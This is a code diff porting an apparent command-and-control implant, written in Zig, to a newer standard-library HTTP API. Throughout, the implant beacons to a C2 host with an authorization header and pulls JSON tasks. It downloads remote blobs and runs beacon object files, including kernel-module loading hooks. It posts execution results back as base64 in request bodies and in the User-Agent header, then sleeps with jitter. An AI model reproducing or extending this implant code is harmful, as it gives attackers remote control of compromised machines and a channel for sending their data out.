@@ -17,8 +17,8 @@ const debug_proxy_port = 8080;
 const ImplantActions = struct {
     const Self = @This();
 
-    kmodLoad: ?*const fn (module_image: [*]const u8, len: usize, param_values: [*:0]const u8) callconv(.C) c_int = null,
-    kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.C) c_int = null,
+    kmodLoad: ?*const fn (module_image: [*]const u8, len: usize, param_values: [*:0]const u8) callconv(.c) c_int = null,
+    kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.c) c_int = null,
 
     pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
         const fields = @typeInfo(Self).@"struct".fields;
@@ -43,22 +43,21 @@ fn fetchBlob(allocator: std.mem.Allocator, state: *State, blob_uri: []const u8) 
 
     const blob_url = try std.Uri.parse(uri);
 
-    var server_header_buffer: [1024]u8 = undefined;
-    var blob_req = try state.http_client.open(.GET, blob_url, .{ .server_header_buffer = &server_header_buffer });
+    var blob_req = try state.http_client.request(.GET, blob_url, .{});
     defer blob_req.deinit();
 
-    try blob_req.send();
-    try blob_req.wait();
+    try blob_req.sendBodiless();
+    var response = try blob_req.receiveHead(&.{});
 
-    if (blob_req.response.status != .ok) {
+    if (response.head.status != .ok) {
         std.log.err("[fetchBlob] Expected response status '200 OK' got '{} {s}'", .{
-            @intFromEnum(blob_req.response.status),
-            blob_req.response.status.phrase() orelse "",
+            @intFromEnum(response.head.status),
+            response.head.status.phrase() orelse "",
         });
         return error.NetworkError;
     }
 
-    const blob_content_type = blob_req.response.content_type orelse {
+    const blob_content_type = response.head.content_type orelse {
         std.log.err("Missing 'Content-Type' header", .{});
         return error.NetworkError;
     };
@@ -71,12 +70,11 @@ fn fetchBlob(allocator: std.mem.Allocator, state: *State, blob_uri: []const u8) 
         return error.NetworkError;
     }
 
-    const blob_content = try allocator.alloc(u8, @intCast(blob_req.response.content_length.?));
+    const blob_content = try allocator.alloc(u8, @intCast(response.head.content_length.?));
     errdefer allocator.free(blob_content);
 
-    const n = try blob_req.readAll(blob_content);
-    if (n != blob_content.len)
-        return error.NetworkError;
+    const body_reader = response.reader(blob_content);
+    try body_reader.readSliceAll(blob_content);
 
     return blob_content;
 }
@@ -87,7 +85,7 @@ const State = struct {
     http_client: std.http.Client,
     heartbeat_authz: []u8,
     heartbeat_uri: std.Uri,
-    pending_bofs: std.ArrayList(PendingBof),
+    pending_bofs: std.array_list.Managed(PendingBof),
     persistent_bofs: std.AutoHashMap(u64, bof.Object),
 
     fn init(allocator: std.mem.Allocator) !State {
@@ -127,7 +125,7 @@ const State = struct {
             .http_client = http_client,
             .heartbeat_authz = heartbeat_authz,
             .heartbeat_uri = try std.Uri.parse("http://" ++ c2_host ++ c2_endpoint),
-            .pending_bofs = std.ArrayList(PendingBof).init(allocator),
+            .pending_bofs = std.array_list.Managed(PendingBof).init(allocator),
             .persistent_bofs = std.AutoHashMap(u64, bof.Object).init(allocator),
         };
     }
@@ -298,25 +296,23 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
 
 fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
     // send heartbeat to C2 and check if any tasks are pending
-    var server_header_buffer: [1024]u8 = undefined;
-    var req = try state.http_client.open(.GET, state.heartbeat_uri, .{
-        .server_header_buffer = &server_header_buffer,
+    var req = try state.http_client.request(.GET, state.heartbeat_uri, .{
         .extra_headers = &.{.{ .name = "authorization", .value = state.heartbeat_authz }},
     });
     defer req.deinit();
 
-    try req.send();
-    try req.wait();
+    try req.sendBodiless();
+    var response = try req.receiveHead(&.{});
 
-    if (req.response.status != .ok) {
+    if (response.head.status != .ok) {
         std.log.err("processCommands: Expected response status '200 OK' got '{} {s}'", .{
-            @intFromEnum(req.response.status),
-            req.response.status.phrase() orelse "",
+            @intFromEnum(response.head.status),
+            response.head.status.phrase() orelse "",
         });
         return error.NetworkError;
     }
 
-    var iter = req.response.iterateHeaders();
+    var iter = response.head.iterateHeaders();
     var content_type: std.http.Header = undefined;
     while (iter.next()) |hdr| {
         if (std.mem.eql(u8, hdr.name, "Content-Type")) {
@@ -327,10 +323,11 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
 
     // task received from C2?
     if (std.ascii.eqlIgnoreCase(content_type.value, "application/json")) {
-        const resp_content = try allocator.alloc(u8, @intCast(req.response.content_length.?));
+        const resp_content = try allocator.alloc(u8, @intCast(response.head.content_length.?));
         defer allocator.free(resp_content);
 
-        _ = try req.readAll(resp_content);
+        const body_reader = response.reader(resp_content);
+        try body_reader.readSliceAll(resp_content);
 
         var parsed = try std.json.parseFromSlice(std.json.Value, allocator, resp_content, .{});
         defer parsed.deinit();
@@ -414,9 +411,7 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
             const result_str = try generateUserAgentString(allocator, bof_exit_code_or_launcher_error);
             defer allocator.free(result_str);
 
-            var server_header_buffer: [1024]u8 = undefined;
-            var request = try state.http_client.open(.POST, state.heartbeat_uri, .{
-                .server_header_buffer = &server_header_buffer,
+            var request = try state.http_client.request(.POST, state.heartbeat_uri, .{
                 .extra_headers = &.{
                     .{ .name = "content-type", .value = "text/plain" },
                     .{ .name = "user-agent", .value = result_str },
@@ -434,14 +429,12 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
 
                     request.transfer_encoding = .{ .content_length = out_b64.len };
 
-                    try request.send();
-                    try request.writeAll(out_b64);
-                    try request.finish();
+                    try request.sendBodyComplete(out_b64);
 
                     std.log.info("Bof exit code sent: {d}", .{bof_exit_code_or_launcher_error});
                     std.log.info("Bof output sent:\n{s}", .{output});
                 } else {
-                    try request.send();
+                    try request.sendBodiless();
 
                     std.log.info("Bof exit code sent: {d}", .{bof_exit_code_or_launcher_error});
                 }
@@ -451,11 +444,10 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
 
                 context.release();
             } else {
-                try request.send();
+                try request.sendBodiless();
 
                 std.log.info("Bof launcher error code sent: {d}", .{bof_exit_code_or_launcher_error});
             }
-            try request.wait();
 
             allocator.free(pending_bof.request_id);
             _ = state.pending_bofs.swapRemove(pending_bof_index);
@@ -479,6 +471,6 @@ pub fn main() !void {
     while (true) {
         processCommands(allocator, &state) catch {};
         processPendingBofs(allocator, &state) catch {};
-        std.time.sleep(jitter * 1e9);
+        std.Thread.sleep(jitter * 1e9);
     }
 }
